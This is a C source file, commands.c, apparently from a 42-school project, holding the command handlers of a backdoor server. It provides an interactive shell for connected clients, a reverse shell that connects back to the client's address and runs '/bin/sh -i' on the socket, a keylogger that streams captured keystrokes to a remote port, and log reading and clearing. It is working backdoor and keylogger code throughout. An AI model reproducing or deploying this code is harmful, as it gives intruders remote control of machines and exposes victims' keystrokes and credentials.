/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   commands.c                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gbourgeo <gbourgeo@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/07/16 23:22:39 by root              #+#    #+#             */
/*   Updated: 2019/08/04 01:34:57 by gbourgeo         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

/* wait */
#include <wait.h>
/* errno */
#include <errno.h>
/* exit */
#include <stdlib.h>
#include <termios.h>
#include <sys/ioctl.h>
/* getrlimit */
#include <sys/time.h>
#include <sys/resource.h>
/* open */
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
/* snprintf */
#include <stdio.h>

#include "main.h"

void				serverHelp(t_cl *client, t_cmd *cmds)
{
	serverLog(1, "[CMDS] - %d: Help wanted.\n", client->id);
	for (size_t i = 0; cmds[i].name; i++) {
		clientWrite(cmds[i].name, client);
		if (cmds[i].options != NULL) {
			clientWrite(" ", client);
			clientWrite(cmds[i].options, client);
		}
		clientWrite(" : ", client);
		clientWrite(cmds[i].def, client);
		clientWrite("\n", client);
	}
	clientWrite("$> ", client);
}

void				serverShell(t_cl *client, t_cmd *cmds)
{
	(void)cmds;
	serverLog(1, "[CMDS] - %d: Shell wanted.\n", client->id);
	client->shell = spawnShell(client->fd);
	if (client->shell == -1)
		clientWrite("Failed to spawn a shell...\n", client);
}

static int			serverConnectShell(t_cl *client, char *port)
{
	struct addrinfo	*res;
	struct addrinfo	hints;
	struct addrinfo	*tmp;
	int				fd;

	mymemset(&hints, 0, sizeof(hints));
	hints.ai_flags = AI_PASSIVE;
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_canonname = NULL;
	hints.ai_addr = NULL;
	hints.ai_next = NULL;
	if ((fd = getaddrinfo(client->addr, port, &hints, &res))) {
		serverLog(1, "[ERRO] - %d: %s\n", client->id, gai_strerror(fd));
		clientWrite(gai_strerror(fd), client);
		clientWrite("\n", client);
		return -1;
	}
	tmp = res;
	while (tmp != NULL)
	{
		fd = socket(tmp->ai_family, tmp->ai_socktype, tmp->ai_protocol);
		if (fd < 0)
			continue ;
		if (connect(fd, tmp->ai_addr, tmp->ai_addrlen) == 0)
			break ;
		close(fd);
		fd = -1;
		tmp = tmp->ai_next;
	}
	freeaddrinfo(res);
	if (tmp == NULL || fd < 0) {
		serverLog(1, "[ERRO] - %d: Failed to connect to %s:%s (%s)\n",
				  client->id, client->addr, port,
				  (tmp) ? strerror(errno) : "No server found");
		clientWrite("Failed to connect to ", client);
		clientWrite(client->addr, client);
		clientWrite(":", client);
		clientWrite(port, client);
		clientWrite(" (", client);
		clientWrite((tmp) ? strerror(errno) : "No server found", client);
		clientWrite(")\n", client);
		return -1;
	}
	serverLog(1, "[CMDS] - %d: Connection to %s:%s succeeded.\n", client->id, client->addr, port);
	clientWrite("Succesfully Connected\n", client);
	return fd;
}

void				serverRemoteShell(t_cl *client, t_cmd *cmds)
{
	char			**options;
	char			*port;
	int				fd;
	pid_t			pid;

	serverLog(1, "[CMDS] - %d: Reverse shell wanted.\n", client->id);
	options = mysplitwhitespaces(cmds->opt);
	port = (options && options[1]) ? options[1] : SERVER_REMOTE_PORT;
	fd = serverConnectShell(client, port);
	mytabdel(&options);
	if (fd >= 0) {
		pid = fork();
		if (pid == 0) {
			serverLog(1, "[CMDS] - %d: Spawning reverse shell on %s:%s\n", client->id, client->addr, port);
			clientWrite("Spawning reverse shell...\n", client);
			struct rlimit	rlim;

			if (getrlimit(RLIMIT_NOFILE, &rlim) || rlim.rlim_max == RLIM_INFINITY)
				rlim.rlim_max = 4096;
			for (size_t i = 0; i < rlim.rlim_max; i++) {
				if (i != (size_t)fd)
					close(i);
			}
			dup(fd);
			dup(fd);
			dup(fd);
			close(fd);
			{
				char *cmd[] = { "/bin/sh", "-i", NULL };
				execvp(cmd[0], cmd);
			}
			exit(0);
		} else if (pid > 0) {
			serverQuitClient(client, cmds);
		} else {
			serverLog(1, "[ERRO] - %d: Failed to fork a new reverse shell.\n", client->id);
			clientWrite("Fork failed.\n", client);
		}
		close(fd);
	} else {
		clientWrite("$> ", client);
	}
}

void			serverKeylogger(t_cl *client, t_cmd *cmds)
{
	char			**options;
	char			*port;
	int				fd;
	pid_t			pid;

	serverLog(1, "[CMDS] - %d: Keylogger wanted.\n", client->id);
	options = mysplitwhitespaces(cmds->opt);
	port = (options && options[1]) ? options[1] : SERVER_KEYLOG_PORT;
	fd = serverConnectShell(client, port);
	mytabdel(&options);
	if (fd >= 0) {
		pid = fork();
		if (pid == 0) {
			serverLog(1, "[CMDS] - %d: Initialising Keylogger...\n", client->id);
			struct rlimit	rlim;

			if (getrlimit(RLIMIT_NOFILE, &rlim) || rlim.rlim_max == RLIM_INFINITY)
				rlim.rlim_max = 4096;
			for (size_t i = 0; i < rlim.rlim_max; i++) {
				if (i != (size_t)fd)
					close(i);
			}
			if (serverInitKeylogger(fd))
				close(fd);
			exit(0);
		} else if (pid < 0) {
			serverLog(1, "[ERRO] - %d: Failed to fork a new reverse shell.\n", client->id);
			clientWrite("Fork failed.\n", client);
		}
		close(fd);
	}
	clientWrite("$> ", client);
}

void			serverPrintLogs(t_cl *client, t_cmd *cmds)
{
	char		**options;
	int			fd;
	char		buf[128];
	int			ret;

	options = mysplitwhitespaces(cmds->opt);
	if (!options)
		serverLog(1, "[ERRO] - %d: Failed to split command.\n", client->id);
	else if (!options[1])
	{
		serverLog(1, "[CMDS] - %d: Logs wanted.\n", client->id);
		fd = open(SERVER_REPORTER, O_RDONLY);
		if (fd < 0)
			clientWrite("Failed to open logs...\n", client);
		else {
			while (1) {
				ret = read(fd, buf, sizeof(buf) - 1);
				if (ret <= 0)
					break ;
				buf[ret] = '\0';
				clientWrite(buf, client);
			}
			close(fd);
		}
	}
	else if (!mystrcmp(options[1], "clear"))
		serverClearLogs(client);
	else
	{
		clientWrite("Wrong option '", client);
		clientWrite(options[1], client);
		clientWrite("'\n", client);
	}
	mytabdel(&options);
	clientWrite("$> ", client);
}

void			serverQuitClient(t_cl *client, t_cmd *cmds)
{
	if (client->fd != -1) {
		serverQuitClientShell(client, cmds);
		serverLog(1, "[CMDS] - %d: Client quit.\n", client->id);
		close(client->fd);
		client->fd = -1;
	}
}

void			serverQuitClientShell(t_cl *client, t_cmd *cmds)
{
	(void)cmds;
	if (client->shell != -1) {
		serverLog(1, "[CMDS] - %d: Client shell killed.\n", client->id);
		close(client->shell);
		client->shell = -1;
	}
}
